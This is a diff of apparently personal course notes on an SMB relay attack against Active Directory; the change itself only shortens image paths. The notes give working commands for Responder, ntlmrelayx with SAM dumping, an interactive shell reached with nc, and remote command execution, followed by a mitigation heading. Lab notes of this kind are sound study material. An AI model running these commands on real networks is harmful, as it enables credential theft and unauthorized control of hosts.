@@ -11,7 +11,7 @@ ___
 ```
 nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
 ```
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150646.png)
+![](assets/Pasted%20image%2020251025150646.png)
 
 ### SMB Relay
 
@@ -19,43 +19,43 @@ Step 1 : Run Responder
 ```
 sudo mousepad /etc/responder/Responder.conf
 ```
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025150836.png)
+![](assets/Pasted%20image%2020251025150836.png)
 
 Step 2 : Run Responder
 ```
 sudo responder -I tun0 -dwP
 ```
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151048.png)
+![](assets/Pasted%20image%2020251025151048.png)
 
 Step 3 : Set up your relay
 ```
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151158.png)
+![](assets/Pasted%20image%2020251025151158.png)
 Step 4 : An Event Occurs...
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151309.png)
+![](assets/Pasted%20image%2020251025151309.png)
 
 Step 5 : Win
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151426.png)
+![](assets/Pasted%20image%2020251025151426.png)
 
 Other Wins 
 ```
 sudo ntlmrelayx.py -tf targets.txt -smb2support -i
 ```
 - We get an interactive shell with the SAM dump by using -i in the command.
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151709.png)
+![](assets/Pasted%20image%2020251025151709.png)
 
 ```
 nc 127.0.0.1 11000
 ```
 - We can connect to this machine, we can look at shares, we can look through the file system and we can do a lot of different stuff via the shell that we have created.
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025151905.png)
+![](assets/Pasted%20image%2020251025151905.png)
 
 - We can also do commands using the -c "whoami" for example and we can do more malicious things such as add a local user with admin access and have more control on the system but we dont need to do that as the SAM dump we get thats enough.
 ```
 sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 ```
-![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%207%20-%20Active%20Directory%20Initial%20Attack%20Vectors/assests/Pasted%20image%2020251025152349.png)
+![](assets/Pasted%20image%2020251025152349.png)
 
 ### Mitigation Strategies:
 1 Enable SMB Signing on all devices
